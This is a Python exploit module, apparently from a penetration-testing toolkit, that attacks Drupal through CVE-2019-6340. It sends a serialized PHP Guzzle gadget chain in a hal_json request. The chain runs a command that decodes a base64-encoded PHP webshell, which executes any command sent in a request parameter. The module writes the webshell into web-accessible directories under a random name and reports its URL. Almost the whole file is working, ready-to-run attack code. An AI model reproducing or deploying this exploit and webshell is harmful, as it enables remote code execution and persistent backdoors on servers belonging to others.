import json
import random
import re
import string
from urllib.parse import urlparse

from . import Utils
from exploits.ACVE import ACVE

__author__ = "Benoit Maurin <bmaurin@immunit.ch> - Jean Lejeune <jlejeune@immunit.ch>"
__copyright__ = "Copyright 2019, ImmunIT"
__credit__ = "https://www.exploit-db.com/exploits/46459"


class Exploit(ACVE):
    """This class tries to exploit CVE-2019-6340.
    """

    def __init__(self, request, target, logger):
        self.request = request
        self.target = target
        self.logger = logger
        self.helper = Utils.Helper(target, request, logger)
        self.cmd = "echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee "
        self.paths = ["./", "./sites/default/", "./sites/default/files/"]

    def run(self, version):
        if not self.helper.setup():
            self.logger.handle("\n[-] Changed my mind, not vulnerable anymore", self.logger.ERROR)

        if not self._warn():
            return

        backdoor_name = self._generateRandomString() + ".php"
        for node in self.helper.nodes:
            for path in self.paths:
                endpoint = path + backdoor_name
                payload = self._generatePayload(endpoint)
                
                self.request.get(node + "?_format=hal_json", {'Content-Type': 'application/hal+json'}, payload)

                if self.request.get("/" + endpoint).status_code == 200:
                    self.logger.handle(
                        (
                            "\n[+] Exploit completed. Webshell accessible at: " + self.target + "/"
                            + endpoint + "?c=CMD"
                        ).replace("./", ""), self.logger.SUCCESS
                    )
                    return
            self.logger.handle("\n[-] Exploit failed. Trying next node", self.logger.ERROR)



    def _warn(self):
        """Warn the user against the downside of this exploit.
        """
        self.logger.handle("\n[*] Nodes used for this exploit will be cached and not usable anymore for further attacks.\n", None)
        
        txt = input("Do you want to proceed? [Y/n]")
        return True if txt.lower() == "y" else False

    def _generateRandomString(self, size=6, chars=string.ascii_uppercase + string.digits):
        """Generates random string.

        Return
        ------
        Random string.
        """

        return ''.join(random.choice(chars) for _ in range(size))

    def _generatePayload(self, endpoint):
        """Generates the payload associated to the given version.

        Parameters
        ----------
        endpoint : str
            Dropping location

        Return
        ------
        The payload to inject.
        """

        serial = (r'"O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:%d:\"%s%s\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"') % (len(self.cmd + endpoint), self.cmd, endpoint)
        payload = """
            {
            "link": [
                {
                "value": "link",
                "options": %s
                }
            ],
            "_links": {
                "type": {
                "href": "%s"
                }
            }
            }
            """ % (serial, self.helper.typ)
        return payload